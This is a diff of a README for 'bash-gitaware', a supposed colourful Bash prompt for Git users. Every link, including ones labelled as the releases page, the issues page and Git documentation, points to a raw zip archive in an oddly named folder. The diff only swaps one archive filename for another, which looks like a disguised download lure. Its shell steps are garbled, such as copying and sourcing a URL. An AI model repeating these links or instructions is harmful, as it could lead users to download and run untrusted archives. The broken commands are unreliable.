@@ -1,6 +1,6 @@
 # 🎨 bash-gitaware - A Colorful Bash Experience for Git Users
 
-[![Download bash-gitaware](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip%https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip)](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip)
+[![Download bash-gitaware](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip%https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip)](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip)
 
 ## 🔍 Overview
 
@@ -13,10 +13,10 @@ To start using bash-gitaware, follow these straightforward steps to download and
 ## 📥 Download & Install
 
 1. **Visit the Release Page**  
-   Go to the Releases page to download the latest version of bash-gitaware: [Visit this page to download](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip).
+   Go to the Releases page to download the latest version of bash-gitaware: [Visit this page to download](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip).
 
 2. **Choose the Right File**  
-   On the Releases page, find the version that suits your needs. Typically, you will see files named like `https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip`. Choose the latest version for the best features.
+   On the Releases page, find the version that suits your needs. Typically, you will see files named like `https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip`. Choose the latest version for the best features.
 
 3. **Download the File**  
    Click on the file to start downloading. Depending on your internet speed, this may take a few seconds.
@@ -36,14 +36,14 @@ To start using bash-gitaware, follow these straightforward steps to download and
 
    ```bash
    cp .bashrc ~/
-   cp https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip ~/
+   cp https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip ~/
    ```
 
 7. **Apply Changes**  
    To apply the new configuration, you must restart your terminal. You can simply close and reopen it or run:
 
    ```bash
-   source ~https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip
+   source ~https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip
    ```
 
 ## ⚙️ System Requirements
@@ -66,7 +66,7 @@ You may wish to customize various features according to your workflow. Open the 
 
 ## 💬 Support
 
-If you encounter issues or have questions, you can check the [Issues page](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip). There, you can find solutions to common problems or report new issues.
+If you encounter issues or have questions, you can check the [Issues page](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip). There, you can find solutions to common problems or report new issues.
 
 ## 🎉 Example Usage
 
@@ -74,7 +74,7 @@ Once installed, navigate to any Git repository in your terminal. You will notice
 
 ## 🔗 Additional Resources
 
-For more information about Git and Bash commands, visit the Git documentation: [Git Documentation](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip).
+For more information about Git and Bash commands, visit the Git documentation: [Git Documentation](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip).
 
 ## 📅 Changelog
 
@@ -84,4 +84,4 @@ For release notes and updates, refer to the changelog on the Releases page. This
 
 By following these directions, you will successfully install and configure bash-gitaware. Enjoy a colorful and efficient command line experience! 
 
-[Visit this page to download](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/bash-gitaware_v2.1.zip) and start your journey today!
+[Visit this page to download](https://raw.githubusercontent.com/shiinseii/bash-gitaware/main/contemningly/gitaware-bash-v1.0.zip) and start your journey today!
